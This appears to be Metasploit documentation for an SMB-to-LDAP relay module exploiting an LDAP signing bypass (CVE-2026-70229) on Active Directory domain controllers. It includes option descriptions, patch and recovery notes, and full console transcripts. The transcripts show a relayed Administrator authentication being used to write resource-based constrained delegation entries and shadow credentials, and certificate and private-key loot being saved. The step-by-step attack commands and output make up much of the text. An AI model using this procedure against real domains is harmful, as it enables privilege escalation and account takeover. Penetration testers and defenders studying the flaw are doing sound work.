## Vulnerable Application

CVE-2026-70229 is an LDAP reauthentication flaw in Active Directory domain controllers. A signed LDAP SASL record can
contain multiple LDAP messages. On affected DCs, reauthentication changes the authorization identity before the
remaining messages in that record are executed, but the entire record was already verified with the bootstrap identity's
known NTLM key.

Windows Server 2016 through Windows Server 2025 DCs were affected before the October 2026 cumulative updates. Its Server
2025 test used build 26100.33451; the fix was introduced in build 26100.33648 by KB5126646. Install the applicable
October 2026 or later cumulative update for each deployed Windows Server release.

The module requires all of the following:

- Plaintext LDAP transport to TCP/389. The LDAP messages are signed and sealed by NTLM SASL; LDAPS and StartTLS are not
  supported by this technique.
- An SMB client that authenticates with NTLM and requests NTLM signing. The module does not remove the MIC or NTLM
  signing, sealing, or key-exchange flags.
- A bootstrap SASL identity. `ANONYMOUS` explicitly attempts anonymous NTLM SASL. This succeeds only on DCs that support
  that context. `NTLM` uses the configured `LDAPDomain`, `LDAPUsername`, and `LDAPPassword`.
- A target account or distinguished name. Account names must be searchable by the bootstrap identity. A direct DN avoids
  that name lookup.
- For RBCD, an existing controlled account or its SID and permission for the bootstrap identity to read the target's
  current `msDS-AllowedToActOnBehalfOfOtherIdentity`. A direct DN and SID do not bypass this read prerequisite by
  default. `RBCDOverwrite` explicitly skips the target reads and requires a direct target DN and delegate SID, but can
  destroy existing delegation entries without a backup.
- For shadow credentials, Active Directory Certificate Services and PKINIT support must be available for later
  certificate authentication. The bootstrap identity does not need permission to read existing key credentials because
  the module uses an LDAP ADD rather than replacing the attribute. With anonymous bootstrap, `TARGET_ACCOUNT` must be a
  full DN; account names and SIDs are rejected before the listener starts.

Bootstrap credentials authenticate only the initial signed SASL connection. The identity relayed from SMB supplies the
authorization for the LDAP modification.

The module performs no coercion. It also creates no LDAP session, acquires no Kerberos ticket, and performs no command
execution. The result is only the configured directory attribute change.

## Verification Steps

1. Build an authorized lab with two domain-joined Windows systems: an affected DC and an SMB client identity that has
   write permission for the selected directory attribute.
1. Configure the DC to require LDAP signing.
1. Create or select an existing controlled account for RBCD, and record its SID if anonymous directory searches will be
   restricted.
1. Start Metasploit Framework.
1. Run `use auxiliary/server/relay/smb_to_ldap_signing_bypass`.
1. Configure `RHOSTS` with the DC address and `TARGET_ACCOUNT` with an explicit sAMAccountName or DN.
1. For RBCD, configure `DELEGATE_FROM` with the controlled account or its SID.
1. For shadow credentials with anonymous bootstrap, supply the full target DN in `TARGET_ACCOUNT`. No delegate account
   or SID is needed.
1. If anonymous NTLM SASL is unsupported, set `BOOTSTRAP_AUTH NTLM` and set `LDAPDomain`, `LDAPUsername`, and
   `LDAPPassword`.
1. Run the module and separately cause the authorized SMB client to authenticate to the module's listener.
1. Confirm the exact ACE or device ID with a fresh LDAP connection.

The module suppresses a repeat for a confirmed or uncertain write. Stop and restart the job only after investigating an
uncertain result; a disconnect alone neither confirms the write nor establishes that the target is patched.

An SMB relay listener belongs to one running job. Stop the old relay job before starting another on the same address and
port with changed options. Reloading the selected module does not update an already running job. A conflicting job is
rejected instead of reusing the old listener and its callbacks. Restart msfconsole after updating the shared SMB relay
library so the new ownership check is loaded.

## Options

### ACTION

`RBCD` adds one ACE to the existing `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor and preserves the
descriptor read during preparation by default. `SHADOW_CREDENTIALS` generates a certificate and adds one
`msDS-KeyCredentialLink` value without replacing current values. The default is `RBCD`.

RBCD uses a read-modify-replace operation prepared before the victim's final authentication exchange. It preserves the
descriptor observed during that read, but a concurrent update made after preparation and before replacement can be
overwritten. Avoid other RBCD changes while an attempt is active, and retain the stored original descriptor for
recovery.

If the target is readable but no descriptor is returned, the module uses an LDAP attribute ADD. Because RBCD is
single-valued, an existing descriptor that was hidden from the bootstrap identity causes the write to fail instead of
being overwritten. `RBCDOverwrite` explicitly replaces the descriptor without reading it first.

### BOOTSTRAP_AUTH

`ANONYMOUS` attempts only anonymous NTLM SASL. `NTLM` uses only the three LDAP credential options. There is no automatic
fallback between modes. The default is `ANONYMOUS`.

Anonymous authentication does not automatically skip directory reads. The bootstrap identity's read access is separate
from the relayed identity's write access. An established anonymous SASL layer does not prove that directory searches are
permitted. The LDAP credential options are ignored in this mode.

### LDAPDomain, LDAPUsername, LDAPPassword

Credentials used when `BOOTSTRAP_AUTH` is `NTLM`. They establish the initial signed context and perform required lookups
and read-back verification.

### TARGET_ACCOUNT

Required sAMAccountName or full LDAP distinguished name to modify. This is not implicitly derived from the relayed
identity. Use a direct DN if the bootstrap identity cannot search the directory. A full DN is required with
`RBCDOverwrite`; a sAMAccountName cannot be resolved without a directory search.

For `SHADOW_CREDENTIALS` with `BOOTSTRAP_AUTH ANONYMOUS`, a full target DN is required and is used without target
searches. A target SID is not supported. Credentialed `NTLM` bootstrap continues to accept sAMAccountNames. This avoids
depending on anonymous directory visibility, even on servers that permit some anonymous searches. `DELEGATE_FROM` and
`RBCDOverwrite` apply only to RBCD; shadow credentials always use LDAP ADD and preserve existing key credentials.

### DELEGATE_FROM

For `RBCD`, the existing controlled sAMAccountName whose SID is added to the descriptor. A direct SID is accepted when
directory searches are unavailable. The module never creates an account. A direct SID is required with `RBCDOverwrite`.

### RBCDOverwrite

Advanced RBCD option, disabled by default. When enabled, the module skips target and delegate lookups and does not read
or back up the current RBCD descriptor. It builds a new descriptor containing only the requested delegate ACE and
attempts to replace the entire attribute under the relayed identity.

**Existing delegation entries may be overwritten and cannot be restored by this module. Removing the added ACE does not
restore the previous descriptor.** Record an independent backup before using this option if the existing settings must
be recoverable. The module prints a warning before starting the listener.

This option requires the full target distinguished name in `TARGET_ACCOUNT` and a direct SID in `DELEGATE_FROM`. It
allows preparing the RBCD modification when anonymous directory reads are unavailable. RootDSE SASL-layer validation and
post-write verification are still attempted. If read-back is unavailable, the LDAP modification response determines
whether the write is confirmed; losing that response leaves the outcome unconfirmed.

### BASE_DN

Optional directory search base. The module attempts to discover `defaultNamingContext` over the bootstrap context when
this is unset. It is not needed when every input is a DN or SID, except that RBCD still requires a successful
base-object read of the current descriptor unless `RBCDOverwrite` is enabled.

### RHOSTS and RPORT

LDAP targets and plaintext LDAP port. The default port is 389. Port 636 is rejected because LDAPS does not provide the
identity-owned SASL security layer used by this technique.

## Result Interpretation

The module tracks victim authentication and directory modification separately. A successful bind does not imply that the
write ran. A successful LDAP modify response or a fresh bootstrap-authenticated read-back confirms completion. When
neither is available, the write is reported as unconfirmed and is not automatically replayed. Incorrect bootstrap
credentials, denied lookups, victim authentication rejection, and insufficient write privileges are reported at their
respective stages.

## Recovery

For RBCD with `RBCDOverwrite` disabled, an existing binary security descriptor returned during preparation is stored as
loot before it is replaced. Recovery should remove only the ACE for the reported `DELEGATE_FROM` SID. If exact
restoration is needed, use the stored original descriptor with an authorized LDAP client; if the attribute was
previously absent, remove the attribute after confirming it contains only the added ACE.

With `RBCDOverwrite` enabled, the original descriptor and even its prior presence are unknown. The module has no backup
of overwritten entries. Restore previous delegation settings from an independent backup; removing the added ACE alone
cannot recover them. Investigate an unconfirmed write before making any further changes.

For shadow credentials, the PKCS#12 certificate and private key are persisted before the write. The exact DN-Binary
value is saved separately as recovery loot. The PKCS#12 password is empty. Remove only the reported device ID or that
exact value. Existing key credentials are not replaced. Keep the generated material until an uncertain result has been
investigated.

## Scenarios
All testing was preformed relaying from a Windows 10 22H2 client to a Windows Server 2019 DC.
### Scenario 1: RBCD with Anonymous Bootstrap
```
msf> use auxiliary/server/relay/smb_to_ldap_signing_bypass
[*] Setting default action RBCD - view all 2 actions with the show actions command
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set RHOSTS 10.5.134.192
RHOSTS => 10.5.134.192
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set SMBDomain WHISTLER.LOCAL
SMBDomain => WHISTLER.LOCAL
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set BOOTSTRAP_AUTH ANONYMOUS
BOOTSTRAP_AUTH => ANONYMOUS
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set TARGET_ACCOUNT CN=Administrator,CN=Users,DC=whistler,DC=local
TARGET_ACCOUNT => CN=Administrator,CN=Users,DC=whistler,DC=local
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set DELEGATE_FROM S-1-5-21-3251401367-392282445-322416278-1110
DELEGATE_FROM => S-1-5-21-3251401367-392282445-322416278-1110
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set RBCDOverwrite true
RBCDOverwrite => true
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > run
[*] Auxiliary module running as background job 0.

[!] RBCDOverwrite is enabled: the entire RBCD descriptor will be replaced without being read or backed up. Existing delegation entries may be lost and cannot be restored by this module.
[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started; waiting for an SMB NTLM authentication to relay. No coercion is performed.
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > [*] New request from 10.5.134.194
[*] Received request for WHISTLER\Administrator
[*] Relaying to next target ldap://10.5.134.192:389
[*] Bootstrap ANONYMOUS SASL security layer established with ldap://10.5.134.192:389
[*] Prepared RBCD write on CN=Administrator,CN=Users,DC=whistler,DC=local for S-1-5-21-3251401367-392282445-322416278-1110
[+] Identity: WHISTLER\Administrator - Successfully authenticated against relay target ldap://10.5.134.192:389
[+] Victim authentication succeeded as WHISTLER\Administrator
[+] RBCD modification confirmed on CN=Administrator,CN=Users,DC=whistler,DC=local
[!] RBCD recovery: the original descriptor was not read or backed up. Removing the added ACE cannot restore overwritten entries; restore previous settings from an independent backup.
[*] Received request for WHISTLER\Administrator
[*] Identity: WHISTLER\Administrator - All targets relayed to

```

### Scenario 2: RBCD with NTLM Bootstrap
Keeping the options from Scenario 1 we change the following inorder to use NTLM bootstrap authentication instead of
anonymous. Note that the DELEGATE_FROM and TARGET_ACCOUNT options can use the sAMAccountName instead of the full
distinguished name or SID. This is because the module can use the credentials provided in the NTLM bootstrap to perform
the necessary directory searches. The DELEGATE_FROM option can also use a SID instead of a sAMAccountName or
distinguished name. The RBCDOverwrite option can be set to false, so the module will read and back up the existing RBCD
descriptor before attempting to modify it. This allows for recovery if needed (which is not possible when RBCDOverwrite
is set to true).
```
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set BOOTSTRAP_AUTH NTLM
BOOTSTRAP_AUTH => NTLM
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set LDAPDomain whistler.local
LDAPDomain => whistler.local
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set LDAPUsername sandy
LDAPUsername => sandy
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set LDAPPassword v3Mpassword
LDAPPassword => v3Mpassword
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set DELEGATE_FROM NewComputer
DELEGATE_FROM => NewComputer
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set TARGET_ACCOUNT Administrator
TARGET_ACCOUNT => Administrator
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set RBCDOverwrite false
RBCDOverwrite => false
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > run
[*] Auxiliary module running as background job 1.

[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started; waiting for an SMB NTLM authentication to relay. No coercion is performed.
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > [*] New request from 10.5.134.194
[*] Received request for WHISTLER\Administrator
[*] Relaying to next target ldap://10.5.134.192:389
[*] Bootstrap NTLM SASL security layer established with ldap://10.5.134.192:389
[*] Prepared RBCD write on CN=Administrator,CN=Users,DC=whistler,DC=local for S-1-5-21-3251401367-392282445-322416278-1110 (NewComputer$)
[+] Identity: WHISTLER\Administrator - Successfully authenticated against relay target ldap://10.5.134.192:389
[+] Victim authentication succeeded as WHISTLER\Administrator
[+] RBCD modification confirmed on CN=Administrator,CN=Users,DC=whistler,DC=local
[*] RBCD recovery: remove only the ACE for SID S-1-5-21-3251401367-392282445-322416278-1110; original descriptor stored at /Users/jheysel/.msf4/loot/20261112111630_default_10.5.134.192_windows.ad.rbcd_966893.bin
[*] Received request for WHISTLER\Administrator
[*] Identity: WHISTLER\Administrator - All targets relayed to

msf auxiliary(server/relay/smb_to_ldap_signing_bypass) >
```

## Scenario 3: Shadow Credentials with Anonymous Bootstrap
```
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set ACTION SHADOW_CREDENTIALS
ACTION => SHADOW_CREDENTIALS
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set BOOTSTRAP_AUTH ANONYMOUS
BOOTSTRAP_AUTH => ANONYMOUS
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set TARGET_ACCOUNT CN=Administrator,CN=Users,DC=whistler,DC=local
TARGET_ACCOUNT => CN=Administrator,CN=Users,DC=whistler,DC=local
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > run
[*] Auxiliary module running as background job 5.

[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started; waiting for an SMB NTLM authentication to relay. No coercion is performed.
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > [*] New request from 10.5.134.194
[*] Received request for WHISTLER\Administrator
[*] Relaying to next target ldap://10.5.134.192:389
[*] Bootstrap ANONYMOUS SASL security layer established with ldap://10.5.134.192:389
[*] Prepared shadow credential with device ID f43683f6-89ff-2850-2ff8-63fc1cf57299; empty-password PKCS#12 certificate and private key stored at /Users/jheysel/.msf4/loot/20261112123242_default_10.5.134.192_windows.ad.shado_481175.pfx
[*] Exact recovery value stored at /Users/jheysel/.msf4/loot/20261112123242_default_10.5.134.192_windows.ad.shado_677316.txt
[+] Identity: WHISTLER\Administrator - Successfully authenticated against relay target ldap://10.5.134.192:389
[+] Victim authentication succeeded as WHISTLER\Administrator
[+] SHADOW_CREDENTIALS modification confirmed on CN=Administrator,CN=Users,DC=whistler,DC=local
[*] Credential material remains at /Users/jheysel/.msf4/loot/20261112123242_default_10.5.134.192_windows.ad.shado_481175.pfx; remove only device ID f43683f6-89ff-2850-2ff8-63fc1cf57299 or the exact value at /Users/jheysel/.msf4/loot/20261112123242_default_10.5.134.192_windows.ad.shado_677316.txt to recover
[*] Received request for WHISTLER\Administrator
[*] Identity: WHISTLER\Administrator - All targets relayed to
```

## Scenario 4: Shadow Credentials with NTLM Bootstrap
```
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set BOOTSTRAP_AUTH NTLM
BOOTSTRAP_AUTH => NTLM
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set LDAPDomain whistler.local
LDAPDomain => whistler.local
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set LDAPUsername sandy
LDAPUsername => sandy
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set LDAPPassword v3Mpassword
LDAPPassword => v3Mpassword
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > set TARGET_ACCOUNT Administrator
TARGET_ACCOUNT => Administrator
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > run
[*] Auxiliary module running as background job 7.

[*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started; waiting for an SMB NTLM authentication to relay. No coercion is performed.
msf auxiliary(server/relay/smb_to_ldap_signing_bypass) > [*] New request from 10.5.134.194
[*] Received request for WHISTLER\Administrator
[*] Relaying to next target ldap://10.5.134.192:389
[*] Bootstrap NTLM SASL security layer established with ldap://10.5.134.192:389
[*] Prepared shadow credential with device ID 0a3d1e2a-b498-30e1-ae0c-1475c26e601d; empty-password PKCS#12 certificate and private key stored at /Users/jheysel/.msf4/loot/20261112125413_default_10.5.134.192_windows.ad.shado_279757.pfx
[*] Exact recovery value stored at /Users/jheysel/.msf4/loot/20261112125413_default_10.5.134.192_windows.ad.shado_420846.txt
[+] Identity: WHISTLER\Administrator - Successfully authenticated against relay target ldap://10.5.134.192:389
[+] Victim authentication succeeded as WHISTLER\Administrator
[+] SHADOW_CREDENTIALS modification confirmed on CN=Administrator,CN=Users,DC=whistler,DC=local
[*] Credential material remains at /Users/jheysel/.msf4/loot/20261112125413_default_10.5.134.192_windows.ad.shado_279757.pfx; remove only device ID 0a3d1e2a-b498-30e1-ae0c-1475c26e601d or the exact value at /Users/jheysel/.msf4/loot/20261112125413_default_10.5.134.192_windows.ad.shado_420846.txt to recover
[*] Received request for WHISTLER\Administrator
[*] Identity: WHISTLER\Administrator - All targets relayed to
```
